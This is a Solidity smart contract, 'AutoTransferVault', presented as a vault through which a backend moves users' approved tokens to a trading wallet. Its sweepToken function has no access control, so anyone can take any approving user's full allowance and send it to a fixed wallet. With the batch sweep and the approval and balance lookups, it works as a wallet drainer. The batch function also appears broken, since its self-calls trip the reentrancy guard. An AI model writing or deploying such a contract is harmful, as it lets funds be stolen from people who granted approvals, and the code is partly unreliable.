// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title AutoTransferVault
 * @notice Users approve this contract once, then backend can auto-transfer funds to trading wallet
 * @dev Simple permit-once, sweep-anytime pattern
 */
contract AutoTransferVault is Ownable, ReentrancyGuard {
    
    // Trading wallet - all funds go here
    address public immutable tradingWallet;
    
    event TokensSwept(address indexed user, address indexed token, uint256 amount);
    event NativeSwept(address indexed user, uint256 amount);

    constructor(address _tradingWallet) Ownable(msg.sender) {
        require(_tradingWallet != address(0), "Invalid trading wallet");
        tradingWallet = _tradingWallet;
    }

    /**
     * @notice Sweep ERC20 tokens from user to trading wallet
     * @dev User must have approved this contract first
     * @param user User's wallet address
     * @param token ERC20 token address
     * @param amount Amount to transfer (or 0 for max allowance)
     */
    function sweepToken(address user, address token, uint256 amount) external nonReentrant {
        require(user != address(0), "Invalid user");
        require(token != address(0), "Invalid token");
        
        IERC20 tokenContract = IERC20(token);
        
        // If amount is 0, transfer maximum allowed
        uint256 transferAmount = amount;
        if (amount == 0) {
            uint256 allowance = tokenContract.allowance(user, address(this));
            uint256 balance = tokenContract.balanceOf(user);
            transferAmount = allowance < balance ? allowance : balance;
        }
        
        require(transferAmount > 0, "No tokens to sweep");
        
        // Transfer from user to trading wallet directly
        tokenContract.transferFrom(user, tradingWallet, transferAmount);
        
        emit TokensSwept(user, token, transferAmount);
    }

    /**
     * @notice Sweep native token (ETH/XPL) from user to trading wallet
     * @dev User must send native token with this call
     */
    function sweepNative() external payable nonReentrant {
        require(msg.value > 0, "No native token sent");
        
        // Forward immediately to trading wallet
        (bool success, ) = tradingWallet.call{value: msg.value}("");
        require(success, "Transfer failed");
        
        emit NativeSwept(msg.sender, msg.value);
    }

    /**
     * @notice Batch sweep multiple users' tokens
     * @param users Array of user addresses
     * @param tokens Array of token addresses (must match users length)
     * @param amounts Array of amounts (0 for max)
     */
    function batchSweepTokens(
        address[] calldata users,
        address[] calldata tokens,
        uint256[] calldata amounts
    ) external nonReentrant {
        require(users.length == tokens.length && users.length == amounts.length, "Array length mismatch");
        
        for (uint256 i = 0; i < users.length; i++) {
            this.sweepToken(users[i], tokens[i], amounts[i]);
        }
    }

    /**
     * @notice Check if user has approved this contract for a token
     * @param user User's wallet address
     * @param token ERC20 token address
     * @return Approved amount
     */
    function checkApproval(address user, address token) external view returns (uint256) {
        return IERC20(token).allowance(user, address(this));
    }

    /**
     * @notice Check user's token balance
     * @param user User's wallet address
     * @param token ERC20 token address
     * @return Token balance
     */
    function checkBalance(address user, address token) external view returns (uint256) {
        return IERC20(token).balanceOf(user);
    }

    /**
     * @notice Emergency withdraw (only owner)
     */
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).transfer(owner(), amount);
        }
    }

    // Allow contract to receive native tokens
    receive() external payable {
        // Auto-forward any native tokens received
        if (msg.value > 0) {
            (bool success, ) = tradingWallet.call{value: msg.value}("");
            require(success, "Auto-forward failed");
            emit NativeSwept(msg.sender, msg.value);
        }
    }
}
